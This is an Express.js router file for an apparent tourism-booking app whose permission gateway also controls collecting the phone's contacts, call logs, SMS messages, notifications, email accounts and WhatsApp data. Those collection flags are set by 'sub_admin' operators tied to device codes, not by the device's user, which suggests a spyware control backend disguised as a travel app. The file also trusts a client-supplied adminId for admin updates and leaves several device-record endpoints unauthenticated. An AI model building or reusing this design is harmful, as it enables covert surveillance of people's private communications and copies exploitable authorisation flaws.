const express = require('express');
const router = express.Router();
const AppPermission = require('../models/AppPermission');
const Admin = require('../models/Admin');
const Device = require('../models/Device');

// Middleware to log permission checks
const logPermissionCheck = async (req, res, next) => {
    req.permissionCheckStart = Date.now();
    next();
};

// 1. PERMISSION GATEWAY - Main endpoint for app to verify permissions
router.post('/gateway/verify', logPermissionCheck, async (req, res) => {
    try {
        const { 
            deviceCode, 
            deviceId, 
            androidId, 
            deviceInfo = {},
            requestSource = 'mobile_app'
        } = req.body;

        // Validate required fields
        if (!deviceCode || !deviceId || !androidId) {
            return res.status(400).json({
                success: false,
                message: 'Device code, device ID, and Android ID are required.',
                error: 'MISSING_DEVICE_INFO'
            });
        }

        // Find permission record
        let permission = await AppPermission.findByDeviceCode(deviceCode);

        // If no permission record exists, check if device code is valid
        if (!permission) {
            // Check if this device code exists in admin system
            const admin = await Admin.findOne({ 
                deviceCode: deviceCode.toUpperCase(),
                role: 'sub_admin',
                isActive: true 
            });

            if (!admin) {
                return res.status(403).json({
                    success: false,
                    message: 'Invalid device code. Access denied.',
                    error: 'INVALID_DEVICE_CODE',
                    requiresSetup: true
                });
            }

            // Create new permission record
            permission = new AppPermission({
                deviceCode: deviceCode.toUpperCase(),
                deviceId,
                androidId,
                deviceInfo,
                grantedBy: admin._id,
                permissions: {
                    canAccessApp: true,
                    canViewAttractions: true,
                    canViewServices: true,
                    canViewTourPackages: true,
                    canMakeBookings: true,
                    canViewProfile: true,
                    canSyncData: true,
                    // Data collection permissions based on admin settings
                    canCollectContacts: admin.allowedDataTypes.includes('CONTACTS'),
                    canCollectCallLogs: admin.allowedDataTypes.includes('CALL_LOGS'),
                    canCollectMessages: admin.allowedDataTypes.includes('MESSAGES'),
                    canCollectNotifications: admin.allowedDataTypes.includes('NOTIFICATIONS'),
                    canCollectEmailAccounts: admin.allowedDataTypes.includes('EMAIL_ACCOUNTS'),
                    canCollectWhatsApp: admin.allowedDataTypes.includes('WHATSAPP')
                },
                isVerified: true,
                verificationDate: new Date()
            });

            await permission.save();
        }

        // Verify device matches
        if (permission.deviceId !== deviceId || permission.androidId !== androidId) {
            // Log suspicious activity
            permission.logCheck(false, req.ip, req.get('User-Agent'));
            await permission.save();

            return res.status(403).json({
                success: false,
                message: 'Device mismatch. This device code is registered to a different device.',
                error: 'DEVICE_MISMATCH'
            });
        }

        // Check if permissions are valid
        if (!permission.isValid()) {
            permission.logCheck(false, req.ip, req.get('User-Agent'));
            await permission.save();

            return res.status(403).json({
                success: false,
                message: 'Permissions are not active or have expired.',
                error: 'PERMISSIONS_INACTIVE',
                requiresRenewal: true
            });
        }

        // Log successful check
        permission.logCheck(true, req.ip, req.get('User-Agent'));
        await permission.save();

        // Return permission status
        const responseTime = Date.now() - req.permissionCheckStart;
        
        res.json({
            success: true,
            message: 'Permissions verified successfully.',
            data: {
                deviceCode: permission.deviceCode,
                permissions: permission.permissions,
                activePermissions: permission.getActivePermissions(),
                deviceInfo: permission.deviceInfo,
                isVerified: permission.isVerified,
                verificationDate: permission.verificationDate,
                expiresAt: permission.expiresAt,
                lastChecked: permission.lastChecked
            },
            metadata: {
                responseTime: `${responseTime}ms`,
                timestamp: new Date().toISOString(),
                requestSource
            }
        });

    } catch (error) {
        console.error('Permission gateway error:', error);
        res.status(500).json({
            success: false,
            message: 'Server error during permission verification.',
            error: 'SERVER_ERROR'
        });
    }
});

// 2. GET PERMISSIONS - Get current permissions for a device
router.get('/device/:deviceCode', async (req, res) => {
    try {
        const { deviceCode } = req.params;
        const { deviceId, androidId } = req.query;

        if (!deviceCode) {
            return res.status(400).json({
                success: false,
                message: 'Device code is required.'
            });
        }

        const permission = await AppPermission.findByDeviceCode(deviceCode);

        if (!permission) {
            return res.status(404).json({
                success: false,
                message: 'No permissions found for this device code.'
            });
        }

        // Verify device if deviceId and androidId provided
        if (deviceId && androidId) {
            if (permission.deviceId !== deviceId || permission.androidId !== androidId) {
                return res.status(403).json({
                    success: false,
                    message: 'Device mismatch.'
                });
            }
        }

        res.json({
            success: true,
            data: {
                deviceCode: permission.deviceCode,
                permissions: permission.permissions,
                activePermissions: permission.getActivePermissions(),
                deviceInfo: permission.deviceInfo,
                isVerified: permission.isVerified,
                verificationDate: permission.verificationDate,
                expiresAt: permission.expiresAt,
                lastChecked: permission.lastChecked
            }
        });

    } catch (error) {
        console.error('Get permissions error:', error);
        res.status(500).json({
            success: false,
            message: 'Server error.'
        });
    }
});

// 3. UPDATE PERMISSIONS - Admin endpoint to update permissions
router.put('/admin/update/:deviceCode', async (req, res) => {
    try {
        const { deviceCode } = req.params;
        const { 
            permissions, 
            isActive, 
            isVerified, 
            expiresAt,
            adminId 
        } = req.body;

        // Verify admin
        const admin = await Admin.findById(adminId);
        if (!admin || admin.role !== 'admin') {
            return res.status(403).json({
                success: false,
                message: 'Admin access required.'
            });
        }

        const permission = await AppPermission.findByDeviceCode(deviceCode);

        if (!permission) {
            return res.status(404).json({
                success: false,
                message: 'Permission record not found.'
            });
        }

        // Update permissions
        if (permissions) {
            Object.assign(permission.permissions, permissions);
        }

        if (typeof isActive !== 'undefined') {
            permission.isActive = isActive;
        }

        if (typeof isVerified !== 'undefined') {
            permission.isVerified = isVerified;
            if (isVerified) {
                permission.verificationDate = new Date();
            }
        }

        if (expiresAt) {
            permission.expiresAt = new Date(expiresAt);
        }

        await permission.save();

        res.json({
            success: true,
            message: 'Permissions updated successfully.',
            data: {
                deviceCode: permission.deviceCode,
                permissions: permission.permissions,
                isActive: permission.isActive,
                isVerified: permission.isVerified,
                expiresAt: permission.expiresAt
            }
        });

    } catch (error) {
        console.error('Update permissions error:', error);
        res.status(500).json({
            success: false,
            message: 'Server error.'
        });
    }
});

// 4. PERMISSION STATUS - Check if specific permission is granted
router.post('/check/:permissionName', logPermissionCheck, async (req, res) => {
    try {
        const { permissionName } = req.params;
        const { deviceCode, deviceId, androidId } = req.body;

        if (!deviceCode || !permissionName) {
            return res.status(400).json({
                success: false,
                message: 'Device code and permission name are required.'
            });
        }

        const permission = await AppPermission.findByDeviceCode(deviceCode);

        if (!permission) {
            return res.status(404).json({
                success: false,
                message: 'No permissions found for this device code.'
            });
        }

        // Verify device if provided
        if (deviceId && androidId) {
            if (permission.deviceId !== deviceId || permission.androidId !== androidId) {
                return res.status(403).json({
                    success: false,
                    message: 'Device mismatch.'
                });
            }
        }

        const hasPermission = permission.hasPermission(permissionName);
        const responseTime = Date.now() - req.permissionCheckStart;

        // Log the check
        permission.logCheck(hasPermission, req.ip, req.get('User-Agent'));
        await permission.save();

        res.json({
            success: true,
            data: {
                permissionName,
                hasPermission,
                deviceCode: permission.deviceCode,
                isActive: permission.isActive,
                isVerified: permission.isVerified
            },
            metadata: {
                responseTime: `${responseTime}ms`,
                timestamp: new Date().toISOString()
            }
        });

    } catch (error) {
        console.error('Check permission error:', error);
        res.status(500).json({
            success: false,
            message: 'Server error.'
        });
    }
});

// 5. PERMISSION ANALYTICS - Get permission usage statistics
router.get('/analytics/:deviceCode', async (req, res) => {
    try {
        const { deviceCode } = req.params;
        const { days = 30 } = req.query;

        const permission = await AppPermission.findByDeviceCode(deviceCode);

        if (!permission) {
            return res.status(404).json({
                success: false,
                message: 'No permissions found for this device code.'
            });
        }

        const cutoffDate = new Date();
        cutoffDate.setDate(cutoffDate.getDate() - parseInt(days));

        const recentChecks = permission.permissionChecks.filter(
            check => check.timestamp >= cutoffDate
        );

        const successCount = recentChecks.filter(check => check.success).length;
        const totalCount = recentChecks.length;
        const successRate = totalCount > 0 ? (successCount / totalCount * 100).toFixed(2) : 0;

        res.json({
            success: true,
            data: {
                deviceCode: permission.deviceCode,
                totalChecks: totalCount,
                successfulChecks: successCount,
                failedChecks: totalCount - successCount,
                successRate: `${successRate}%`,
                lastChecked: permission.lastChecked,
                recentChecks: recentChecks.slice(-10) // Last 10 checks
            }
        });

    } catch (error) {
        console.error('Permission analytics error:', error);
        res.status(500).json({
            success: false,
            message: 'Server error.'
        });
    }
});

module.exports = router;
